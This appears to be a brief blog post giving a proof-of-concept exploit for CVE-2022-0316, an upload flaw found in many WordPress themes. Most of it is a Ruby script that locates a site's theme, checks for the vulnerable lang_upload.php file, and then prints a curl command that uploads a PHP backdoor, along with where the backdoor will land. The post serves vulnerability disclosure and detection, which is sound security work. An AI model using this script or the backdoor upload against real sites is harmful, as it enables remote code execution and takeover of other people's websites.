---
title: Exploit for many Wordpress themes - CVE-2022-0316
description: Exploit poc
date: 2022-02-04
social_image: '/media/images/somuchwin.png'
tags: [CVE-2022-0316, Wordpress, themes]
---
## Detection and exploitation of Wordpress theme CVE-2022-0316

This vulnerability involves a piece of code that for unknown reasons, has been found copy pasted in many themes that are otherwise unrelated. I have not been able to reliably catalog them all.

In the case of the Westand theme, this was pulled by Envato market on January 17th following a lack of response from the supplier. This is an extremely basic RCE that is very hard to miss.

The below code will scan for the vulnerable file and content match on any theme.

```ruby
#!/usr/bin/env ruby

require 'httpclient'

# CVE-2022-0316
URL = 'https://www.mywebsite.com/'

clnt = HTTPClient.new
clnt.ssl_config.set_default_paths
site = clnt.get(URL)

raise "Unable to fetch site" unless site.status == 200

theme = /(http.*\/wp-content\/themes\/[^\/]+)/.match site.content

raise "Unable to detect Wordpress theme" unless theme
puts "Theme Path Detected: " + theme[1]

vulnpath = "#{theme[1]}/include/lang_upload.php"
tester = clnt.get(vulnpath)

if tester.status != 200 or ! /Please select Mo file/.match tester.content
  puts "Vulnerable code path not found"
  exit
end

puts "Site is vulnerable. To upload a backdoor, use the following command:"
puts "curl #{vulnpath} -F \"mofile[]=backdoor.php\""
puts "Backdoor will be placed at: #{theme[1]}/languages/backdoor.php"
```

